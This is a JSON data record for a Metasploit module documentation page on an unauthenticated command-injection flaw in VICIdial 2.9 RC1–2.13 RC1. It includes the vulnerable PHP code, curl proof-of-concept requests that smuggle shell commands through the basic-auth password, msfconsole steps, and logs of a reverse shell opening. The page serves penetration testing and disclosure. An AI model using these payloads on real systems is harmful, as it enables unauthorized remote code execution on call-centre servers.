{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/unix/webapp/vicidial_user_authorization_unauth_cmd_exec","result":{"data":{"moduleMetadataJson":{"id":"851622ac-54bb-59b3-9134-e8c8c8a6a3bc","name":"VICIdial user_authorization Unauthenticated Command Execution","fullname":"exploit/unix/webapp/vicidial_user_authorization_unauth_cmd_exec","description":"This module exploits a vulnerability in VICIdial versions\n        2.9 RC 1 to 2.13 RC1 which allows unauthenticated users\n        to execute arbitrary operating system commands as the web\n        server user if password encryption is enabled (disabled\n        by default).\n\n        When password encryption is enabled the user's password\n        supplied using HTTP basic authentication is used in a call\n        to exec().\n\n        This module has been tested successfully on version 2.11 RC2\n        and 2.13 RC1 on CentOS.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/unix/webapp/vicidial_user_authorization_unauth_cmd_exec","documentationSlug":"/modules/documentation/exploit/unix/webapp/vicidial_user_authorization_unauth_cmd_exec","referencesSlug":"/modules/references/exploit/unix/webapp/vicidial_user_authorization_unauth_cmd_exec"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>  This module exploits a vulnerability in VICIdial versions 2.9 RC1 to 2.13 RC1 which allows unauthenticated users to execute arbitrary operating system commands as the web server user if password encryption is enabled (disabled by default).</p>\n<p>  When password encryption is enabled the user's password supplied using HTTP basic authentication is used in a call to <code class=\"language-text\">exec()</code>.</p>\n<p>  This module has been tested successfully on version 2.11 RC2 and 2.13 RC1 on CentOS.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  VICIDIAL is a software suite that is designed to interact with the Asterisk Open-Source PBX Phone system to act as a complete inbound/outbound contact center suite with inbound email support as well. </p>\n<p>  This module has been tested successfully on version 2.11 RC2 and 2.13 RC1 on CentOS.</p>\n<p>  Installers:</p>\n<ul>\n<li><a href=\"https://sourceforge.net/projects/astguiclient/files/astguiclient_2.11rc1.zip/download\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">VICIdial 2.11 RC1</a></li>\n<li><a href=\"https://sourceforge.net/projects/astguiclient/files/astguiclient_2.13rc1.zip/download\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">VICIdial 2.13 RC1</a></li>\n</ul>\n<p>  Follow the <a href=\"http://vicidial.org/docs/ENCRYPTED_PASSWORDS.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">instructions to enabled password encryption</a>.</p>\n<h2 id=\"technical-details\" style=\"position:relative;\"><a href=\"#technical-details\" aria-label=\"technical details permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Technical Details</h2>\n<p>  The <code class=\"language-text\">functions.php</code> file defines a function called <code class=\"language-text\">user_authorization</code>:</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-php line-numbers\"><code class=\"language-php\"><span class=\"token keyword\">function</span> <span class=\"token function\">user_authorization</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$pass</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$user_option</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$user_update</span><span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>  This function is used throughout the application to validate user logon credentials supplied using HTTP basic authentication. If password encryption is enabled the user's password is passed to the <code class=\"language-text\">pass</code> argument of the <code class=\"language-text\">bp.pl</code> Perl script, without quotes, using PHP's <code class=\"language-text\">exec()</code> function:</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-php line-numbers\"><code class=\"language-php\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$SSpass_hash_enabled</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"../agc/bp.pl\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">{</span><span class=\"token variable\">$pass_hash</span> <span class=\"token operator\">=</span> <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"../agc/bp.pl --pass=<span class=\"token interpolation\"><span class=\"token variable\">$pass</span></span>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">else</span>\n                <span class=\"token punctuation\">{</span><span class=\"token variable\">$pass_hash</span> <span class=\"token operator\">=</span> <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"../../agc/bp.pl --pass=<span class=\"token interpolation\"><span class=\"token variable\">$pass</span></span>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>  A rudimentary blacklist is used to prevent command injection. The apostrophe <code class=\"language-text\">&#39;</code>, quote <code class=\"language-text\">&quot;</code>, semi-colon <code class=\"language-text\">;</code> and backslash <code class=\"language-text\">\\</code> characters are removed from the user's username and password using <code class=\"language-text\">preg_replace</code>, like so:</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-php line-numbers\"><code class=\"language-php\"><span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"/\\'|\\\"|\\\\\\\\|;/\"</span><span class=\"token punctuation\">,</span><span class=\"token double-quoted-string string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"/\\'|\\\"|\\\\\\\\|;/\"</span><span class=\"token punctuation\">,</span><span class=\"token double-quoted-string string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$pass</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>  It is trivial to bypass the blacklist.</p>\n<p>  For example, backticks <code class=\"language-text\">`</code>, pipe <code class=\"language-text\">|</code> or ampersand <code class=\"language-text\">&amp;</code> are sufficient to bypass the blacklist and execute arbitrary operating system commands.</p>\n<p>  For the purposes of exploitation, reaching the <code class=\"language-text\">user_authorization</code> function call with malicious input is hindered by additional input validation in use prior to the authentication check throughout the majority of the codebase:</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-php line-numbers\"><code class=\"language-php\"><span class=\"token variable\">$PHP_AUTH_USER</span> <span class=\"token operator\">=</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'/[^-_0-9a-zA-Z]/'</span><span class=\"token punctuation\">,</span> <span class=\"token single-quoted-string string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$PHP_AUTH_USER</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$PHP_AUTH_PW</span> <span class=\"token operator\">=</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'/[^-_0-9a-zA-Z]/'</span><span class=\"token punctuation\">,</span> <span class=\"token single-quoted-string string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$PHP_AUTH_PW</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>  However, in VICIdial version 2.11RC2, at least two files did not make use of the additional validation:</p>\n<ul>\n<li>help.php</li>\n<li>vicidial<em>sales</em>viewer.php</li>\n</ul>\n<p>  In VICIdial version 2.13RC1, at least one file did not make use of the additional validation:</p>\n<ul>\n<li>vicidial<em>sales</em>viewer.php</li>\n</ul>\n<p>  This vulnerability was patched in revision 2759.</p>\n<h2 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h2>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">curl</span> -isk <span class=\"token string\">\"https://VICIdial.local/vicidial/vicidial_sales_viewer.php\"</span> <span class=\"token punctuation\">\\</span>\n--user <span class=\"token string\">'anyusername:anypassword&amp; id>/tmp/pwned_by_sales_viewer #'</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">curl</span> -isk <span class=\"token string\">\"https://VICIdial.local/vicidial/help.php\"</span> <span class=\"token punctuation\">\\</span>\n--user <span class=\"token string\">'anyusername:anypassword&amp; id>/tmp/pwned_by_help #'</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>  Note that <code class=\"language-text\">/tmp/pwned_by_help</code> and <code class=\"language-text\">/tmp/pwned_by_sales_viewer</code> files should contain the results of the <code class=\"language-text\">id</code> command.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Do: <code class=\"language-text\">use exploit/unix/webapp/vicidial_user_authorization_unauth_cmd_exec</code></li>\n<li>Do: <code class=\"language-text\">set rhost [IP]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a session</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(vicidial_user_authorization_unauth_cmd_exec) &gt; check\n[*] 172.16.191.150:80 The target appears to be vulnerable.\nmsf exploit(vicidial_user_authorization_unauth_cmd_exec) &gt; run\n\n[*] Started reverse TCP handler on 172.16.191.181:4444 \n[*] 172.16.191.150:80 Sending payload (505 bytes)\n[+] 172.16.191.150:80 Payload sent successfully\n[*] Command shell session 1 opened (172.16.191.181:4444 -&gt; 172.16.191.150:36660) at 2017-05-27 01:00:41 -0400\n\nid\nuid=48(apache) gid=48(apache) groups=48(apache)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"verbose\" style=\"position:relative;\"><a href=\"#verbose\" aria-label=\"verbose permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verbose</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(vicidial_user_authorization_unauth_cmd_exec) &gt; set verbose true\nverbose =&gt; true\nmsf exploit(vicidial_user_authorization_unauth_cmd_exec) &gt; check\n\n[*] 172.16.191.150:80 Password encryption is supported, but may not be enabled.\n[*] 172.16.191.150:80 The target appears to be vulnerable.\nmsf exploit(vicidial_user_authorization_unauth_cmd_exec) &gt; run\n\n[*] Started reverse TCP handler on 172.16.191.181:4444 \n[*] 172.16.191.150:80 Sending payload (505 bytes)\n[+] 172.16.191.150:80 Payload sent successfully\n[*] Command shell session 2 opened (172.16.191.181:4444 -&gt; 172.16.191.150:36661) at 2017-05-27 01:00:48 -0400\n\nid\nuid=48(apache) gid=48(apache) groups=48(apache)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"851622ac-54bb-59b3-9134-e8c8c8a6a3bc"}}}